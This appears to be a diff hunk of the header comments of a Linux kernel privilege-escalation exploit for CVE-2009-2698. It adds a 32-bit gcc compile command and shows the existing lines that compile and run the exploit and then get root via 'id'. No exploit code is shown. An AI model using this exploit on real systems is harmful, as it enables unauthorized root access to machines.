@@ -13,6 +13,7 @@
 ** Thankful to them.
 **
 ** --
+** kali$ gcc -m32 -Wl,--hash-style=both 9542.c -o 9542
 ** bash$ gcc -o 0x82-CVE-2009-2698 0x82-CVE-2009-2698.c && ./0x82-CVE-2009-2698
 ** sh-3.1# id
 ** uid=0(root) gid=0(root) groups=500(x82) context=user_u:system_r:unconfined_t
